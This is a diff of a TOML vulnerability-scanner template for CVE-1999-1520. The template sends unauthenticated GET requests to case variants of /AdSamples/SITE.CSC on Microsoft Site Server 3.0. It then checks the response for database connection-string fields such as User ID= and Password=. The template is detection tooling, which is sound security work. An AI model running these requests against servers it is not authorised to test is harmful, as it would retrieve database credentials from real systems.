@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "Microsoft Site Server 3.0 的 AdSamples 目录存在配置不当，攻击者可未经身份验证直接通过 HTTP 请求获取 SITE.CSC 文件，该文件包含 SQL 数据库连接字符串等敏感配置信息。此 PoC 通过请求 SITE.CSC 文件并检测响应内容判断漏洞是否存在。"
+description = "检测 Microsoft Site Server Commerce Edition 3.0 alpha AdSamples 目录下的 SITE.CSC 敏感配置文件泄露，该文件包含 SQL 数据库连接敏感信息"
 id = "POC-AVE-1999-1157"
-name = "CVE-1999-1520 Microsoft Site Server AdSamples SITE.CSC 敏感信息泄露 PoC"
+name = "CVE-1999-1520 PoC"
 severity = "medium"
 tags = ["ave-1999-1157"]
 vuln_id = [
@@ -18,51 +18,61 @@ method = "GET"
 path = "/AdSamples/SITE.CSC"
 protocol = "http"
 
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
-
-[[poc.requests.matchers]]
-expect = true
-status = [200]
-type = "status"
-
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "SQL",
-    "Database",
-    "Connection",
-    "Server",
-    "DSN",
-    "UID",
-    "PWD",
+    "Data Source=",
+    "Initial Catalog=",
+    "User ID=",
+    "Password=",
 ]
 
 [[poc.requests]]
 method = "GET"
-path = "/SITE.CSC"
+path = "/Adsamples/SITE.CSC"
 protocol = "http"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
-
-[[poc.requests.matchers]]
-expect = true
-status = [200]
-type = "status"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "SQL",
-    "Database",
-    "Connection",
-    "Server",
-    "DSN",
-    "UID",
-    "PWD",
+    "Data Source=",
+    "Initial Catalog=",
+    "User ID=",
+    "Password=",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/adsamples/SITE.CSC"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Data Source=",
+    "Initial Catalog=",
+    "User ID=",
+    "Password=",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/adsamples/site.csc"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Data Source=",
+    "Initial Catalog=",
+    "User ID=",
+    "Password=",
 ]
